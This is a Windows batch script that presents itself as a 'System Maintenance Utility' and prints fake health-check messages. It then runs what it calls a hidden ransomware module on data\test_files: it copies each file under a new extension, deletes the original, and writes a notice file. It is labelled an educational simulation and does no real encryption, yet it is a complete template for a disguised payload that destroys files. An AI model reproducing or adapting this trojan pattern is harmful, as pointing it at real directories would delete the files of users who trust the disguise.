REM LEGITIMATE WINDOWS BATCH FILE
REM This appears to be a normal system maintenance script
REM When executed, it will encrypt files in the target directory
REM Educational purposes only!

@echo off
title System Maintenance Utility
echo ==================================================
echo LEGITIMATE SYSTEM MAINTENANCE UTILITY
echo ==================================================
echo This script performs routine system maintenance
echo Processing system files and optimizing performance
echo ==================================================

REM Normal-looking batch code that users expect to see
echo [INFO] Checking system health...
timeout /t 1 /nobreak >nul
echo [INFO] Scanning for temporary files...
timeout /t 1 /nobreak >nul
echo [INFO] Optimizing system performance...
timeout /t 1 /nobreak >nul

REM HIDDEN RANSOMWARE CODE - Activates during execution
echo.
echo ==================================================
echo WARNING: EDUCATIONAL RANSOMWARE MODULE ACTIVATED
echo ==================================================
echo This batch file contains embedded encryption code!
echo Target Directory: data\test_files
echo Educational demonstration only.
echo ==================================================

set TARGET_DIR=data\test_files
set ENCRYPTED_EXT=.legit_bat

echo [TARGET] %TARGET_DIR%
timeout /t 2 /nobreak >nul

echo [STARTING] Educational encryption process...

set COUNT=0
for /r "%TARGET_DIR%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "%ENCRYPTED_EXT%" >nul
        if errorlevel 1 (
            echo [PROCESSING] %%~nxf
            copy "%%f" "%%f%ENCRYPTED_EXT%" >nul 2>&1
            if exist "%%f%ENCRYPTED_EXT%" (
                del "%%f" >nul 2>&1
                set /a COUNT+=1
            )
        )
    )
)

REM Create educational notice
echo =============================================== > "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo     LEGITIMATE BATCH RANSOMWARE SIMULATION >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo This batch file contained hidden encryption code >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo that activated during execution. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo Target Directory: %TARGET_DIR% >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo Files Processed: %COUNT% >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo Extension Added: %ENCRYPTED_EXT% >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo This demonstrates how legitimate-looking batch >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo files can contain hidden malicious functionality. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo. >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo         EDUCATIONAL SIMULATION ONLY >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\LEGITIMATE_BATCH_NOTICE.txt"

echo [NOTE] Created educational notice file
echo [COMPLETE] Processed %COUNT% files

echo.
echo ==================================================
echo LEGITIMATE BATCH UTILITY EXECUTION COMPLETE
echo ==================================================
echo Files processed: %COUNT%
echo Target directory: %TARGET_DIR%
echo This was an educational demonstration only.
echo ==================================================

pause